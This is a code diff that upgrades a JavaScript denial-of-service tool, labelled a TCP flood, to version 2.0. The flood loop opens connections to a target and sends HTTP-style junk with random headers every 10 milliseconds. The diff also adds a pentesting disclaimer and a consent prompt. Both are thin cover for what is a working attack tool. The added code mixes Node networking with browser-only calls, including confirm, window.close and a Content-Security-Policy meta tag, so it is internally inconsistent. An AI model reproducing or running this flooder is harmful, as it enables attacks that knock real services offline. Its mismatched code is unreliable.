@@ -1,11 +1,10 @@
 // ******************************************************************************
-// * WARNING: THIS TOOL IS FOR EDUCATIONAL AND TESTING PURPOSES ONLY!        *
-// * ILLEGAL USE IS STRICTLY PROHIBITED. THE CREATOR IS NOT RESPONSIBLE FOR *
-// * ANY DAMAGE CAUSED BY MISUSE OF THIS TOOL. USE AT YOUR OWN RISK!          *
+// *   WARNING: THIS TOOL IS FOR PENTESTING ONLY! ILLEGAL USE IS PROHIBITED.   *
+// *   NOODLES INC. IS NOT RESPONSIBLE FOR MISUSE. USE AT YOUR OWN RISK!      *
 // ******************************************************************************
 
 // ******************************************************************************
-// *                  DDoS TOOL - TCP FLOOD - v1.0                             *
+// *                   DDoS TOOL - TCP FLOOD - v2.0                             *
 // ******************************************************************************
 
 // Configuration
@@ -49,25 +48,25 @@ async function tcpFlood(threadId) {
       const socket = net.createConnection({ host: targetHost, port: port }, () => {
         log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
         // Send garbage data
-        socket.write("GET / HTTP/1.1\r\n");
-        socket.write(`Host: ${targetHost}\r\n`);
-        socket.write("Connection: keep-alive\r\n");
-        socket.write("Cache-Control: max-age=0\r\n");
-        socket.write("Upgrade-Insecure-Requests: 1\r\n");
-        socket.write("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n");
-        socket.write("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n");
-        socket.write("Accept-Encoding: gzip, deflate\r\n");
-        socket.write("Accept-Language: en-US,en;q=0.9\r\n\r\n");
-
-        // Keep sending data
-        setInterval(() => {
-          try {
-            socket.write("X-Flooder: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n");
-          } catch (writeError) {
-            log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
-            socket.destroy();
-          }
-        }, 10); // Send data every 10ms
+        let intervalId = setInterval(() => {
+            let payload = "GET / HTTP/1.1\r\n";
+            payload += `Host: ${targetHost}\r\n`;
+            payload += "Connection: keep-alive\r\n";
+            payload += "Cache-Control: max-age=0\r\n";
+            payload += "Upgrade-Insecure-Requests: 1\r\n";
+            payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
+            payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
+            payload += "Accept-Encoding: gzip, deflate\r\n";
+            payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
+            payload += "X-Flooder: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n";
+            try {
+                socket.write(payload);
+            } catch (writeError) {
+                log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
+                clearInterval(intervalId);
+                socket.destroy();
+            }
+        }, 10);
       });
 
       socket.on('error', (err) => {
@@ -101,4 +100,20 @@ async function main() {
   }, duration * 1000);
 }
 
-main();
+// Explicit user consent required
+if (confirm("WARNING: This tool is for PENTESTING purposes only. Unauthorized use is illegal. Noodles Inc. is not responsible for any misuse. Do you agree to proceed?")) {
+    main();
+} else {
+    window.close(); // Close the window if the user does not agree
+}
+
+// Educational Information (Can be expanded in the UI)
+console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable.", "color: darkblue;");
+
+// Security Headers (Example - adapt as needed for the server environment)
+// This would typically be set server-side, but for demonstration:
+try {
+    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">`);
+} catch (e) {
+    console.warn("[WARN] Could not set security headers. This is expected in some environments.");
+}
